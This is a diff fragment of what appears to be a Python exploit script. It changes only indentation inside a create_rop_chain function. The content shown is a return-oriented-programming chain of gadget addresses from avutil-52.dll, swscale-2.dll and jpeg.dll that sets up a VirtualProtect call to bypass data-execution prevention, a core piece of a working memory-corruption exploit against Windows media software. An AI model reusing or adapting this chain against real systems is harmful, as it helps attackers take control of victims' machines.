@@ -60,7 +60,7 @@ def create_rop_chain():
       0x41414141,  # Filler (compensate)
       0x41414141,  # Filler (compensate)
       0x41414141,  # Filler (compensate)
-	  0x66d97465,  # POP EAX # POP EBX # RETN [avutil-52.dll]
+      0x66d97465,  # POP EAX # POP EBX # RETN [avutil-52.dll]
       0xfffffdff,  # Value to negate, will become 0x00000201
       0x41414141,  # Filler (compensate)
       0x66d9d9ba,  # NEG EAX # RETN [avutil-52.dll]
@@ -71,17 +71,17 @@ def create_rop_chain():
       0x1005f6e4,  # ADD EBX,EAX # OR EAX,3000000 # RETN [jpeg.dll]
       0x6ab01cf8,  # POP EDI # RETN [swscale-2.dll]
       0x6ab16202,  # RETN (ROP NOP) [swscale-2.dll]
-	  0x100482ff,  # POP EAX # POP EBP # RETN [jpeg.dll]
+      0x100482ff,  # POP EAX # POP EBP # RETN [jpeg.dll]
       0x6ab561b0,  # ptr to &VirtualProtect() [IAT swscale-2.dll]
       0x41414141,  # Filler (compensate)
       0x66dab225,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [avutil-52.dll]
       0x6ab19780,  # XCHG EAX,ESI # RETN [swscale-2.dll]
-	  0x6ab0a3bc,  # POP EBP # RETN [swscale-2.dll]
+      0x6ab0a3bc,  # POP EBP # RETN [swscale-2.dll]
       0x6ab01c06,  # & push esp # ret  [swscale-2.dll]
-	  0x6ab3d687,  # POP EAX # POP ECX # RETN [swscale-2.dll]
+      0x6ab3d687,  # POP EAX # POP ECX # RETN [swscale-2.dll]
       0x90909090,  # NOP
       0x41414141,  # Filler (compensate)
-	  0x10028125,  # POP ECX # RETN [jpeg.dll]
+      0x10028125,  # POP ECX # RETN [jpeg.dll]
       0x6ab4e661,  # &Writable location [swscale-2.dll]
       0x6ab2e490,  # PUSHAD # RETN [swscale-2.dll]
     ]
